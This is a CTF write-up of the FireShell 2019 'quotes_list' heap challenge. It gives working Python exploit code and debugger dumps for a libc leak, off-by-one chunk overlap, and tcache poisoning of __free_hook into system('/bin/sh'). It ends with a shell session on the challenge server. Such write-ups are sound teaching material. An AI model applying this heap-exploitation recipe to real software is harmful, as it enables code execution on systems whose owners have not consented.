+++
title = "FireShell 2019 - quotes_list"
date = "2019-01-28 06:54:42"
categories = ["pwn", "writeup"]
+++

## downloads
- [binary](/assets/fireshell/quotes_list/quotes_list.zip)
- [libc.so.6](/assets/fireshell/quotes_list/libc.so.6)
- [ld-linux-x86-64.so.2](/assets/fireshell/quotes_list/ld-linux-x86-64.so.2)
- [solve.py](/assets/fireshell/quotes_list/solve.py)

## prep
You'll need to patch elf binary to make it run correctly. Using `patchelf`,
```sh
patchelf --set-interpreter `pwd`/ld-linux-x86-64.so.2
patchelf --set-rpath `pwd`
```

## summary
1. Usual heap exploitation challenge layout, you have `create`, `edit`, `show`, and `delete`.
2. No UAF, pointer set to zero after chunk gets freed. _or is it(?)_
3. Arbritrary off-by-one write in `edit`.
4. for unknown _reason(?)_, `show` uses `strncpy` to a buffer in stack initialized with `alloca(16 * ((chunk_size + 15) / 16 ))` then print it.

## exploit
A brief helper function,
```python
def create(length, content):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', length.__str__())
    r.sendafter(': ', content)

def edit(index, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', index.__str__())
    r.sendafter(': ', content)

def show(index):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', index.__str__())
    r.recvuntil(': ')
    return r.recvuntil('\n-----', drop=True)

def delete(index):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', index.__str__())
```

### leak libc
The binary uses libc v2.28 which enables `tcache`, a simple trick to leak libc is to allocate a huge chunk that big enough to surpass `smallbins` and `free` it, for some reasons allocating smallbins then free, it will only get your chunk back to tcache free list and we don't want that. Code speak louder than words,
```python
create(0x1000, '0') # _huge_ chunk
create(0x18, '1') # will be used later
create(0x18, '2') # will be used later
create(0x18, '3') # will be used later

# pwndbg> dq $piebase+0x202040
# 0000555555756040     000055555575c250 000055555575d270
# 0000555555756050     000055555575d290 000055555575d2b0
# 0000555555756060     0000000000000000 0000000000000000
# 0000555555756070     0000001800001000 0000001800000018

delete(0)

# pwndbg> dq $piebase+0x202040
# 0000555555756040     0000000000000000 000055555575d270
# 0000555555756050     000055555575d290 000055555575d2b0
# 0000555555756060     0000000000000000 0000000000000000
# 0000555555756070     00000018ffffffff 0000001800000018

# pwndbg> dq 0x000055555575c250
# 000055555575c250     0000000000000000 0000000000001011
# 000055555575c260     0000155555327ca0 0000155555327ca0
#                       ^-- fd populated

# pwndbg> x/gx 0x0000155555327ca0
# 0x155555327ca0 <main_arena+96>: 0x000055555575d2c0

create(0x18, '0')

# pwndbg> dq 0x000055555575c250
# 000055555575c250     0000000000000000 0000000000000021
# 000055555575c260     0000155555328230 00001555553282c0
# 000055555575c270     000055555575c250 0000000000000ff1
# 000055555575c280     0000155555327ca0 0000155555327ca0

# pwndbg> unsortedbin
# unsortedbin
# all: 0x55555575c270 —▸ 0x155555327ca0 (main_arena+96) ◂— 0x55555575c270

libc.address = u64(show(0).ljust(8, '\x00')) - 0x3af230
```

### off-by-one write
after allocate memory with `create`, you can `edit` the buf with exactly one byte larger than actual size. This could lead to corrupt the chunk metadata.
```python
# pwndbg> dq 0x000055555575d260 50
# 000055555575d260     0000000000000ff0 0000000000000020
# 000055555575d270     0000000000000031 0000000000000000
# 000055555575d280     0000000000000000 0000000000000021
# 000055555575d290     0000000000000032 0000000000000000
# 000055555575d2a0     0000000000000000 0000000000000021
# 000055555575d2b0     0000000000000033 0000000000000000
# 000055555575d2c0     0000000000000000 000000000001fd41

edit(1, '\x00' * 0x18 + '\x71') # overlap

# pwndbg> dq 0x000055555575d260 50
# 000055555575d260     0000000000000ff0 0000000000000020
# 000055555575d270     0000000000000000 0000000000000000
# 000055555575d280     0000000000000000 0000000000000071
#                                         ^-- corrupted
# 000055555575d290     0000000000000032 0000000000000000
# 000055555575d2a0     0000000000000000 0000000000000021
# 000055555575d2b0     0000000000000033 0000000000000000
# 000055555575d2c0     0000000000000000 000000000001fd41
```

after corrupting metadata size, we could trick `free` to put this chunk in a larger chunk (0x70) tcache free list.

```python
delete(2)

# pwndbg> dq 0x000055555575d260 50
# 000055555575d260     0000000000000ff0 0000000000000020
# 000055555575d270     0000000000000000 0000000000000000
# 000055555575d280     0000000000000000 0000000000000071
# 000055555575d290     0000000000000000 000055555575c010
# 000055555575d2a0     0000000000000000 0000000000000021

# pwndbg> tcachebins
# tcachebins
# 0x70 [  1]: 0x55555575d290 ◂— 0x0 <--- !!!!
```
By malloc first-fit behaviour, `malloc` with size `(0x68)` will return the freed chunk before where the actual chunk size should be `(0x18)`. Thus, we could achieve complete takeover for the next chunk.
```python
create(0x68, '2')

# pwndbg> dq 0x000055555575d260 50
# 000055555575d260     0000000000000ff0 0000000000000020
# 000055555575d270     0000000000000000 0000000000000000
# 000055555575d280     0000000000000000 0000000000000071
# 000055555575d290     0000000000000032 0000000000000000
# 000055555575d2a0     0000000000000000 0000000000000021
```

After that, it's just a simple poke around in `tcache-poison`ing, overwrite `__free_hook` to `system`, and trigger `free` to call `system`.

```python
delete(3)
edit(2, '\x00' * 0x20 + p64(libc.symbols['__free_hook']))

# pwndbg> tcachebins
# tcachebins
# 0x20 [  1]: 0x55555575d2b0 —▸ 0x1555553298c8 (__free_hook) ◂— 0x0

create(0x18, '/bin/sh\x00') # 3
create(0x18, p64(libc.symbols['system'])) # 4

delete(3) # trigger free('/bin/sh') -> system('/bin/sh')
```

## flag
```
[+] Opening connection to 35.243.188.20 on port 2005: Done
[*] Switching to interactive mode
Timeout!
$ ls
flag.txt
quotes_list
quotes_list.sh
$ cat flag.txt
F#{th3r3_ar3_s0m3_n3ws_c0mm1ng_1nt0_libc-2.29}$
[*] Interrupted
[*] Closed connection to 35.243.188.20 port 2005
```
